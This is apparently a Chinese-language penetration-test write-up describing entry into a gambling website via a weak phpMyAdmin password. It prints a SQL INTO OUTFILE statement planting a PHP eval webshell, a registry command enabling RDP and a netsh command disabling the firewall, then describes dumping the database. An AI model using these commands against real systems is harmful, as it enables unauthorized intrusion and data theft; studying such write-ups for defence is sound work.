某种原因，接手了一个授权的bc站。

  
内心是拒绝的，但是没办法，硬着头皮收下了。

  
其实都知道，bc站不是很好弄，在大佬眼里，可能就是掏出一个0day就进去了  
但像我这种dd，只敢远观。

  
打开主页，还算清新的画风，比那些打开就这闪那闪花里胡哨的站舒服多了。  

  

![](../Images/a9f20cd8490f1a0c2fa5ddd4264ff070.png)

  
简单的扫了一下目录，扫出了两个比较有用的的东西就是一个后台，一个探针  

  

![](../Images/60d5fe3ccdcad119cb01cffe3fa857bd.png)

  
见到后台，废话不多说，直接弱口令套餐来一份

  
得到的结果肯定是  密码错误X1   密码错误X2   密码错误X3…………  

  
算了，不浪费时间了，看一下探针~  根据探针，得知网站的根目录。

  

底下有phpmyadmin的连接测试  

  

![](../Images/ec6e3b4d51385fec1879458d519702b8.png)

  
  
直接弱口令再来一套，root  root    密码错误

Root 123456  密码错  唉   不对  好像是连接成功了  

![](../Images/aba816bbe0762addf5af7e54e6c3623d.png)

  
激动的留下了眼泪  
根据探针，得知phpmyadmin的后台地址  

![](../Images/5a562e3200b850814050eeeafdda3b99.png)

  
Root 123456  
登录  

![](../Images/36f69a89e74addb370c2bd20c99b9c74.png)

  
Phpmyadmin进来了，网站根目录也知道了，那还唠啥了，直接拿shell了

  
直接执行sql语句

  

select'<?php @eval($\_POST\[pass\]);?>' into outfile 'D:/xxx/xxx/xxx.php'

  

![](../Images/ea3699de95dbb6defd4918112cb0b19f.png)

  
一句话连接上，

  
Whoami  system …………  没意思啊，提权都不用了  

  

![](../Images/5c199f5b4e789e90e047ccba98aea907.png)

  
通过查看服务器文件，得知后台登陆密码，登陆后台  

![](../Images/539e036b5bd83b180ed22c94df1b2bb1.png)

  
因为个人喜好，比较喜欢用cs，powshell上线

  
读了一下密码，直接远程连接

  

![](../Images/5be3335529c85e2a672cd121f11e82a8.png)

  
但是  

![](../Images/ac9eb990085b4ff06804fbecbc7591ca.png)

  
netstat -an  ，没开3389  

  

![](../Images/9f047c73a99f798587389f2615f3d2ee.png)

  
开启3389

  

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f

  
但是连接了一下，还是不行，用nmap扫描了一下端口，只有80端口开放  
应该是开着防火墙  

  
netsh firewall set opmode mode=disable  关闭防火墙  

  

![](../Images/327aa64950d8a4d8bb8db4a326eaddac.png)

  
再连接3389   连接成功  

  

![](../Images/bde6d6348186dbeffcb329311256cfd0.png)

  
根据浏览器历史记录，又发现另一个网站后台  

  

![](../Images/7f4f91bdc6a2744c6a40df8767967c5d.png)

  
到现在其实没啥了，直接数据库打包~完活上交。
